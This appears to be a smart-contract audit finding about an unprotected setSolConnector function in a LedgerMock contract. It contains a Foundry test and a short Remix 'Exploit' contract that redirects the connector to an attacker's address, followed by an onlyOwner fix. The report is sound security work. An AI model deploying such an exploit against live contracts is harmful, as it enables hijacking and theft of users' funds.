# Lack of Access Control in setSolConnector Function in LedgerMock Contract

### Summary

The `LedgerMock` contract allows external users to update the `SolConnector` address through the `setSolConnector` function. This function lacks access control, enabling any user to replace the `SolConnector` with a malicious contract, potentially compromising the entire system, including unauthorized withdrawals or fund redirection.

### Root Cause

The `setSolConnector` function does not implement access control mechanisms to restrict who can update the `SolConnector` address. There are no checks (such as `onlyOwner` or `onlyAuthorized`) to ensure that only authorized addresses can perform this operation.

### Internal pre-conditions

1.The `LedgerMock` contract must be deployed with an initial `SolConnector` address.
2.No access control mechanism exists in the contract.

### External pre-conditions

1.An attacker must have knowledge of the `setSolConnector` function in the deployed `LedgerMock` contract.
2.The attacker must have access to an external address from which to call the `setSolConnector` function.

### Attack Path

1.The attacker identifies the deployed `LedgerMock` contract and the absence of access control on the `setSolConnector` function.

2.The attacker calls the `setSolConnector` function with a malicious contract address under their control.

3.The `LedgerMock` contract updates the `solConnecto`r to the attacker-controlled address.

4.The attacker can now exploit the `solConnector` for unauthorized actions such as withdrawing funds or manipulating sensitive operations.


### Impact

1.**Unauthorized Control**: Any external user can take control of the `SolConnector` by setting it to a malicious contract.

2.**Loss of Funds**: If the `SolConnector` contract handles funds, the attacker can potentially withdraw or redirect them to unauthorized addresses.

3.**System Compromise**: Changing the `SolConnector` to an untrusted contract could compromise core system functionality, leading to a breakdown in operations.


### PoC

Here is a PoC demonstrating how an external attacker can exploit this vulnerability:
**For Foundry:**
```solidity
function testUnauthorizedSetSolConnector() public {
    // Deploy LedgerMock with a dummy SolConnector address
    LedgerMock ledger = new LedgerMock(address(0x123));

    // An attacker calls setSolConnector from an unauthorized account
    ledger.setSolConnector(address(0x456));  // Malicious contract address

    // Assert that the solConnector has been updated to the attacker's address
    assertEq(ledger.solConnector(), address(0x456));
}
```
**Using Remix IDE :**
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

interface ILedgerMock {
    function setSolConnector(address _solConnector) external;
}

contract Exploit {
    ILedgerMock public target;

    constructor (address _LedgerMock) {
        target = ILedgerMock(_LedgerMock);
    }

    function attack() public{
        target.setSolConnector(address(this));
    }
}
```
1.Deploy the `LedgerMock` contract.

2.Call the `setSolConnector` function using any external account, passing a new (possibly malicious) contract address.

3.Observe that the` solConnector` is updated without any restriction.

### Mitigation

To fix this issue, implement proper access control mechanisms to restrict access to the `setSolConnector` function. Only authorized addresses (such as the contract owner) should be able to update the `SolConnector`.

Recommended solution using Ownable:
```solidity
contract LedgerMock is ILedger, Ownable {
    // Other code...

    function setSolConnector(address _solConnector) external onlyOwner {
        solConnector = SolConnector(payable(_solConnector));
    }
}
```
Additionally, emit events to log changes to the `solConnector` for better traceability:
```solidity
event SolConnectorUpdated(address indexed newSolConnector);

function setSolConnector(address _solConnector) external onlyOwner {
    solConnector = SolConnector(payable(_solConnector));
    emit SolConnectorUpdated(_solConnector);
}
```
These changes will prevent unauthorized updates to the `SolConnector` and improve overall security.
